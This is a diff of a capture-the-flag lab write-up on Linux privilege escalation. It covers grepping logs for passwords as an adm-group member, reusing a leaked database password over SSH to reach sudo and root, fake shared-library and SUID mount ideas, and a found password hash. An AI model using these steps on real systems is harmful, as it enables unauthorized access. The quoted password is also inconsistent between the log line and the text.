@@ -161,28 +161,69 @@ $ id
 
 {% embed url="https://wiki.debian.org/SystemGroups" %}
 
-The _**adm**_ group permissions allows the current user to read the files in the `/var/log` file
+1. _**adm**_ group
 
-Found in `/var/logsyslog:`
-
-`Dec 13 15:45:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1`
-
-
-
-`linenum.sh` tool
+After running a few enumeration commands ([https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/privilege-escalation/linux/enumeration](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/privilege-escalation/linux/enumeration)), I found out that the current user (_**tim**_) is in the _**adm**_ group through the `id` command.
 
 ```bash
-$ ./linenum.sh
-SGID
-...
-
-admin
-...
+tim@silver-patter:~$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
 
-1\.
+The _**adm**_ group permissions allows the current user to read some files in the `/var/log` file. These files may contain sensitive log information, and are usually not readable by common users.
 
-User _**tim**_ is able to update `$SHELL`
+<pre class="language-bash"><code class="lang-bash">tim@silver-patter:~$ cd /var/log
+
+# look for all files with the case-insensitive string "password"
+tim@silver-platter:/var/log$ grep -irl --exclude-dir=journal password 2>/dev/null
+
+# print all lines with the case-insensitive string "password"
+<strong>tim@silver-platter:/var/log$ grep -ir password 
+</strong></code></pre>
+
+Found in `/var/log/auth.log.2:`
+
+`Dec 13 15:45:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=10 -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1`
+
+I tried to access the Postgresql database, but it appears that the common CLI tools associated with Postgesql is not installed on the system.
+
+```bash
+$ psql
+$ pgcli
+$ pgbench
+$ pg_restore
+
+...
+Command ... not found, but can be installed with:
+...
+Please ask your administrator
+```
+
+Instead, I tried the found password: `_Zd_zx7N823/` on the user _tyler_ via SSH, and _voila_ it worked!
+
+```bash
+# user is in the sudo group
+tyler@silver-platter~$ id
+uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+
+# user can run all commands with sudo
+tyler@silver-platter~$ sudo -l
+...
+...
+User tyler may run the following commands on silver-platter:
+    (ALL : ALL) ALL
+    
+
+tyler@silver-platter~$ sudo su root
+
+root@silver-platter:/home/tyler# 
+```
+
+
+
+To further my learning, I decided to continue enumerating the system as the user _**tim**_, and try to find other privilege escalation vectors.
+
+2. User _**tim**_ is able to update `$SHELL`
 
 `/snap/core20/1974/usr/lib/openssh/ssh-keysign`
 
@@ -194,9 +235,7 @@ Adding the file to `/tmp` after appending`/tmp` to  `$SHELL` does not work, and 
 
 
 
-2\.
-
-`/snap/core20/2264/usr/bin/sudo: error while loading shared libraries: libsudo_util.so.0: cannot open shared object file: No such file or directory`
+3. `/snap/core20/2264/usr/bin/sudo: error while loading shared libraries: libsudo_util.so.0: cannot open shared object file: No such file or directory`
 
 files looks for shared libraries at `LD_LIBRARY_PATH` env variable instead of `PATH`&#x20;
 
@@ -235,7 +274,18 @@ tmp$ mv libsudo_util.o libsudo_util.so.0
 
 Perhaps after fixing the issue of running `/snap/core20/2264/usr/bin/sudo` (creating fake shared library, etc.), use the sudo binary to run sudo actions
 
-### /usr/bin/mount with SUID
+
+
+```bash
+$ find / -name "libsudo_util.so.0" 2>/dev/null
+
+$ ls -la 
+
+```
+
+It seems that we have rxw permissions for the `libsudo_util.so.0` binary found&#x20;
+
+4. `/usr/bin/mount` with _**SUID**_
 
 Run mountable share (NFS) on attacker hosting shellcode with SUID bit, mount the share from target and execute
 
@@ -245,8 +295,9 @@ Tried to run NFS server on attacker: [https://linuxize.com/post/how-to-install-a
 
 And mount from target (using all 3 diff binaries found from SUID bit find command, but all require root)
 
-
-
-3. `installer/autoinstall-user-data`
+5. `installer/autoinstall-user-data`
 
 Found hashed password: `$6$uJuA1kpnd4kTFniw$/402iWwKzcYD8AMHG6bY/PXwZWOkrrVmtoO7qQpfvVLh1CHmiKUodwMGP7/awDYtrzpDHV8cNbpS1HJ6VMakN.`
+
+
+
